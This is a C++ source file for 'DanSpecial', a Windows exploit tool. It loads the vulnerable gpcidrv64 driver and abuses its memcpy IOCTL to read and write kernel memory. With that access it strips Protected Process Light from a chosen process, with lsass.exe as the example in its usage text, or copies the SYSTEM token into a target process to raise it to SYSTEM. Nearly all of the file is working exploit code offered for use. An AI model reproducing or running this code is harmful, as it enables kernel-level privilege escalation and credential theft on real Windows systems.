#include "pch.h"
#include "DriverLoader.h"
#include "Version.h"
#include "kprocess.h"
#include "virtual_memory.h"
#define IOCTL_GIO_MEMCPY 0xC3502808

HANDLE ghDriver = 0;

extern DWORD EPROCESS_DIRECTORYTABLE_OFFSET;
extern DWORD EPROCESS_UNIQUEPROCESSID_OFFSET;
extern DWORD EPROCESS_ACTIVEPROCESSLINK_OFFSET;
extern DWORD EPROCESS_VIRTUALSIZE;
extern DWORD EPROCESS_SECTIONBASE;
extern DWORD EPROCESS_IMAGEFILENAME;
extern DWORD EPROCESS_PS_PROTECTION;
extern DWORD EPROCESS_TOKEN;

#pragma pack (push,1)

typedef struct _GIO_MemCpyStruct {
	ULONG64 dest;
	ULONG64 src;
	DWORD size;
} GIO_MemCpyStruct;

#pragma pack(pop)

BOOL GIO_memcpy(ULONG64 dest, ULONG64 src, DWORD size)
{
	GIO_MemCpyStruct mystructIn = { dest, src, size };
	BYTE outbuffer[0x30] = { 0 };
	DWORD returned = 0;

	DeviceIoControl(ghDriver, IOCTL_GIO_MEMCPY, (LPVOID)&mystructIn, sizeof(mystructIn), (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);
	if (returned) {
		return TRUE;
	}
	return FALSE;
}

DWORD GetProcId(const char * ProcName)
{
	PROCESSENTRY32   pe32;
	HANDLE         hSnapshot = NULL;
	DWORD pid = 0;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(hSnapshot, &pe32))
	{
		do {
			if (strcmp(pe32.szExeFile, ProcName) == 0) {
				pid = pe32.th32ProcessID;
				break;
			}

		} while (Process32Next(hSnapshot, &pe32));
	}
	if (hSnapshot != INVALID_HANDLE_VALUE)
		CloseHandle(hSnapshot);

	return pid;
}

BOOL InitDriver()
{
	char szDeviceNames[] = "\\\\.\\GIO";
	ghDriver = CreateFileA(szDeviceNames, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (ghDriver == INVALID_HANDLE_VALUE) {
		printf("[-] Cannot get handle to driver \'%s\' - GetLastError:%d\n", szDeviceNames, GetLastError());
		return FALSE;
	}
	return TRUE;
}


void offset_check()
{
	auto windowsVersion = getVersion();
	switch (windowsVersion) {
	case WINDOWS7:
		printf("[+] Windows 7 detected - Untested, if this bugs, please report on github!\n");
		EPROCESS_DIRECTORYTABLE_OFFSET = 0x028;		// [+0x028] _EPROCESS.DirectoryTableBase
		EPROCESS_UNIQUEPROCESSID_OFFSET = 0x180;	// [+0x2E0]	_EPROCESS.UniqueProcessId
		EPROCESS_ACTIVEPROCESSLINK_OFFSET = 0x188;	// [+0x2E8] _EPROCESS.ActiveProcessLinks	
		EPROCESS_VIRTUALSIZE = 0x1D8;				// [+0x338] _EPROCESS.VirtualSize
		EPROCESS_SECTIONBASE = 0x270;				// [+0x3C0] _EPROCESS.SectionBaseAddress
		EPROCESS_TOKEN = 0x208;						// [+0x358] _EPROCESS.Token
		EPROCESS_IMAGEFILENAME = 0x2e0;				// [+0x450] _EPROCESS.ImageFileName [15]
		break;
	case WINDOWS8:
		printf("[+] Windows 8 detected - Untested, if this bugs, please report on github!\n");
		EPROCESS_DIRECTORYTABLE_OFFSET = 0x028;		// [+0x028] _EPROCESS.DirectoryTableBase
		EPROCESS_UNIQUEPROCESSID_OFFSET = 0x2E0;	// [+0x2E0]	_EPROCESS.UniqueProcessId
		EPROCESS_ACTIVEPROCESSLINK_OFFSET = 0x2E8;	// [+0x2E8] _EPROCESS.ActiveProcessLinks	
		EPROCESS_VIRTUALSIZE = 0x328;				// [+0x338] _EPROCESS.VirtualSize
		EPROCESS_SECTIONBASE = 0x3B0;				// [+0x3C0] _EPROCESS.SectionBaseAddress
		EPROCESS_TOKEN = 0x348;						// [+0x358] _EPROCESS.Token
		EPROCESS_IMAGEFILENAME = 0x438;				// [+0x450] _EPROCESS.ImageFileName [15]
		break;
	case WINDOWS81:
		printf("[+] Windows 8.1 detected - Untested, if this bugs, please report on github!\n");
		EPROCESS_DIRECTORYTABLE_OFFSET = 0x028;		// [+0x028] _EPROCESS.DirectoryTableBase
		EPROCESS_UNIQUEPROCESSID_OFFSET = 0x2E0;	// [+0x2E0]	_EPROCESS.UniqueProcessId
		EPROCESS_ACTIVEPROCESSLINK_OFFSET = 0x2E8;	// [+0x2E8] _EPROCESS.ActiveProcessLinks	
		EPROCESS_VIRTUALSIZE = 0x328;				// [+0x338] _EPROCESS.VirtualSize
		EPROCESS_SECTIONBASE = 0x3B0;				// [+0x3C0] _EPROCESS.SectionBaseAddress
		EPROCESS_TOKEN = 0x348;						// [+0x358] _EPROCESS.Token
		EPROCESS_IMAGEFILENAME = 0x438;				// [+0x450] _EPROCESS.ImageFileName [15]
		EPROCESS_PS_PROTECTION = 0x67A;				// [+0x6ca] _EPROCESS.Protection
		break;
		// win 10.0
	case WINDOWS1000:
		printf("[+] Windows 10.0 detected!\n");
		EPROCESS_DIRECTORYTABLE_OFFSET = 0x028;		// [+0x028] _EPROCESS.DirectoryTableBase
		EPROCESS_UNIQUEPROCESSID_OFFSET = 0x2E8;	// [+0x2E0]	_EPROCESS.UniqueProcessId
		EPROCESS_ACTIVEPROCESSLINK_OFFSET = 0x2F0;	// [+0x2E8] _EPROCESS.ActiveProcessLinks	
		EPROCESS_VIRTUALSIZE = 0x338;				// [+0x338] _EPROCESS.VirtualSize
		EPROCESS_SECTIONBASE = 0x3C0;				// [+0x3C0] _EPROCESS.SectionBaseAddress
		EPROCESS_TOKEN = 0x358;						// [+0x358] _EPROCESS.Token
		EPROCESS_IMAGEFILENAME = 0x448;				// [+0x450] _EPROCESS.ImageFileName [15]
		EPROCESS_PS_PROTECTION = 0x6AA;				// [+0x6ca] _EPROCESS.Protection
		break;
	case WINDOWS1511:
		printf("[+] Windows 10 1511 detected!\n");
		EPROCESS_DIRECTORYTABLE_OFFSET = 0x028;		// [+0x028] _EPROCESS.DirectoryTableBase
		EPROCESS_UNIQUEPROCESSID_OFFSET = 0x2E8;	// [+0x2E0]	_EPROCESS.UniqueProcessId
		EPROCESS_ACTIVEPROCESSLINK_OFFSET = 0x2F0;	// [+0x2E8] _EPROCESS.ActiveProcessLinks	
		EPROCESS_VIRTUALSIZE = 0x338;				// [+0x338] _EPROCESS.VirtualSize
		EPROCESS_SECTIONBASE = 0x3C0;				// [+0x3C0] _EPROCESS.SectionBaseAddress
		EPROCESS_TOKEN = 0x358;						// [+0x358] _EPROCESS.Token
		EPROCESS_IMAGEFILENAME = 0x450;				// [+0x450] _EPROCESS.ImageFileName [15]
		EPROCESS_PS_PROTECTION = 0x6B2;				// [+0x6ca] _EPROCESS.Protection
		break;
	case WINDOWS1607:
		printf("[+] Windows 10 1607 detected!\n");
		EPROCESS_DIRECTORYTABLE_OFFSET = 0x028;		// [+0x028] _EPROCESS.DirectoryTableBase
		EPROCESS_UNIQUEPROCESSID_OFFSET = 0x2E8;	// [+0x2E0]	_EPROCESS.UniqueProcessId
		EPROCESS_ACTIVEPROCESSLINK_OFFSET = 0x2F0;	// [+0x2E8] _EPROCESS.ActiveProcessLinks	
		EPROCESS_VIRTUALSIZE = 0x338;				// [+0x338] _EPROCESS.VirtualSize
		EPROCESS_SECTIONBASE = 0x3C0;				// [+0x3C0] _EPROCESS.SectionBaseAddress
		EPROCESS_TOKEN = 0x358;						// [+0x358] _EPROCESS.Token
		EPROCESS_IMAGEFILENAME = 0x450;				// [+0x450] _EPROCESS.ImageFileName [15]
		EPROCESS_PS_PROTECTION = 0x6C2;				// [+0x6ca] _EPROCESS.Protection
		break;
		// win10 1703 and above
	case WINDOWS1703Plus:
		printf("[+] Windows 1703Plus detected!\n");
		EPROCESS_DIRECTORYTABLE_OFFSET = 0x028;		// [+0x028] _EPROCESS.DirectoryTableBase
		EPROCESS_UNIQUEPROCESSID_OFFSET = 0x2E0;	// [+0x2E0]	_EPROCESS.UniqueProcessId
		EPROCESS_ACTIVEPROCESSLINK_OFFSET = 0x2E8;	// [+0x2E8] _EPROCESS.ActiveProcessLinks	
		EPROCESS_VIRTUALSIZE = 0x338;				// [+0x338] _EPROCESS.VirtualSize
		EPROCESS_SECTIONBASE = 0x3C0;				// [+0x3C0] _EPROCESS.SectionBaseAddress
		EPROCESS_TOKEN = 0x358;						// [+0x358] _EPROCESS.Token
		EPROCESS_IMAGEFILENAME = 0x450;				// [+0x450] _EPROCESS.ImageFileName [15]
		EPROCESS_PS_PROTECTION = 0x6ca;				// [+0x6ca] _EPROCESS.Protection
		break;
	default:
		printf("[-] Unsupported OS detected, this won't work or too risky to try!\n");
		exit(0);
	}
}

int main(int argc, char* argv[])
{
	if (argc != 4)
	{
		printf("====== DanSpecial ======\n");
		printf("[-] Not enough arguments.\n");
		printf("[-] Args: \"DanSpecial.exe [1 or 0, 1 to load the driver, 0 to not load driver] [0 1 or 2, 0 for disable PPL, 1 for enable PPL, 2 for privesc] [process name.exe]\"\n");
		printf("[-] Example: \"DanSpecial.exe 1 0 lsass.exe\"    -- Will load the driver (requiresadmin) and disable PPL on lsass.exe\n");
		printf("[-] Example: \"DanSpecial.exe 0 1 firefox.exe\"    -- Will not load the driver (assuming driver is already loaded) and enable PPL on firefox.exe\n");
		printf("[-] Example: \"DanSpecial.exe 0 2 firefox.exe\"    -- Will not load the driver (assuming driver is already loaded) and make firefox.exe an NT Authority process.\n");

		return 0;
	}

	offset_check(); // Make sure we have the offsets for the thingy thing

	printf("[+] Please make sure your version is detected correctly. Incorrect version detection will leads to BSOD.\n");
	printf("[+] Press any key to proceed.\n");
	getchar();

	// Converting args to a usable int in a very terrible way
	int bLoadDriver = atoi(argv[1]);
	int bEnable = atoi(argv[2]);
	char * ProcName = argv[3];

	if (bLoadDriver > 1)
	{
		printf("[-] Options are 1 or 0 only.\n");
		return 0;
	}

	if (bEnable > 2)
	{
		printf("[-] Options are 0 or 1 or 2 only.\n");
		return 0;
	}

	if (bLoadDriver == 1)
	{
		if (!LoadDriver())
		{
			printf("[-] Could not load driver, maybe lack of permission?\n");
			return 0;
		}
	}

	if (!InitDriver()) {
		printf("[-] Could not get a handle to driver, is driver loaded?\n");

		if (bLoadDriver)
		{
			Dl_UnloadDriver(L"gpcidrv64");
			Dl_RemoveDriverFromRegistry(L"gpcidrv64");
		}

		return 0;
	}

	DWORD proc_pid = GetProcId(ProcName);

	if (proc_pid == 0)
	{
		printf("[-] Could not get PID of process %s.\n", ProcName);
		CloseHandle(ghDriver);
		if (bLoadDriver)
		{
			Dl_UnloadDriver(L"gpcidrv64");
			Dl_RemoveDriverFromRegistry(L"gpcidrv64");
		}
		exit(0);
	}

	uintptr_t size = 0;
	uintptr_t pml4 = 0; // translation
	uintptr_t kprocess = find_kprocess(ghDriver, ProcName, proc_pid, size, pml4);


	if (kprocess == 0)
	{
		printf("[-] Could not find KPROCESS of process %s.\n", ProcName);
		CloseHandle(ghDriver);
		if (bLoadDriver)
		{
			Dl_UnloadDriver(L"gpcidrv64");
			Dl_RemoveDriverFromRegistry(L"gpcidrv64");
		}
		exit(0);
	}


	// Enable PPL
	if (bEnable == 1)
	{
		BYTE data = 0x41;
		printf("[+] Leaked %s EProcess: %p\n", ProcName, kprocess);
		write_virtual_memory(ghDriver, pml4, kprocess + EPROCESS_PS_PROTECTION, &data, 1);
		printf("[+] Hopefully %s now have PPL.\n", ProcName);
	}
	// Disable PPL
	else if (bEnable == 0)
	{
		BYTE data = 0;
		printf("[+] Leaked %s EProcess: %p\n", ProcName, kprocess);
		write_virtual_memory(ghDriver, pml4, kprocess + EPROCESS_PS_PROTECTION, &data, 1);
		printf("[+] Hopefully no more PPL\n");
	}
	// PrivEsc
	else if (bEnable == 2)
	{
		uintptr_t system_size = 0;
		uintptr_t system_pml4 = 0; // translation
		uintptr_t system_kprocess = find_kprocess(ghDriver, "wininit.exe", system_size, system_pml4);

		if (system_kprocess == 0)
		{
			printf("[-] Could not find KPROCESS of SYSTEM.\n");
			CloseHandle(ghDriver);
			if (bLoadDriver)
			{
				Dl_UnloadDriver(L"gpcidrv64");
				Dl_RemoveDriverFromRegistry(L"gpcidrv64");
			}
			exit(0);
		}

		// Read system token pointer
		uintptr_t system_token = read_virtual_memory<uintptr_t>(ghDriver, system_pml4, system_kprocess + EPROCESS_TOKEN);

		if (system_token == 0)
		{
			printf("[-] Could not find SYSTEM's token.\n");
			CloseHandle(ghDriver);
			if (bLoadDriver)
			{
				Dl_UnloadDriver(L"gpcidrv64");
				Dl_RemoveDriverFromRegistry(L"gpcidrv64");
			}
			exit(0);
		}

		// Replace our process' token pointer with system's token pointer
		write_virtual_memory(ghDriver, pml4, kprocess + EPROCESS_TOKEN, &system_token, sizeof uintptr_t);

		printf("[+] Hopefully %s is now running as SYSTEM.\n", ProcName);
	}

	CloseHandle(ghDriver);
	if (bLoadDriver) 
	{
		Dl_UnloadDriver(L"gpcidrv64");
		Dl_RemoveDriverFromRegistry(L"gpcidrv64");
	}


	return 0;
}
